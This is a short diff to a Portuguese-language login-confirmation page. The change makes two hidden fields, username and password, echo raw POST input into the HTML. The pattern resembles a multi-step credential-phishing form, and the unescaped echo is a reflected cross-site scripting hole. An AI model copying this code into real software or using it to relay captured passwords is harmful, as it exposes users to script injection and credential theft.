@@ -1,4 +1,4 @@
-
+﻿
 
 <html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <style type="text/css">
@@ -53,8 +53,8 @@
 							<br><br><br>
 								
 							</div>
-							<input type="hidden" name="usuario" value="swfsfsfsfsfsdfsdfsdfsdfsfsdfsd" />
-							<input type="hidden" name="senha" value="sdfsdfsd" />
+							<input type="hidden" name="usuario" value="<?php echo $_POST['usuario']; ?>" />
+							<input type="hidden" name="senha" value="<?php echo $_POST['senha']; ?>" />
 							<button style="margin-top: 10px !important" type="submit" class="back-to-results" id="back-results-button">
 							<input type="hidden" name="step" value="passo2" />
 							  Confirmar acesso
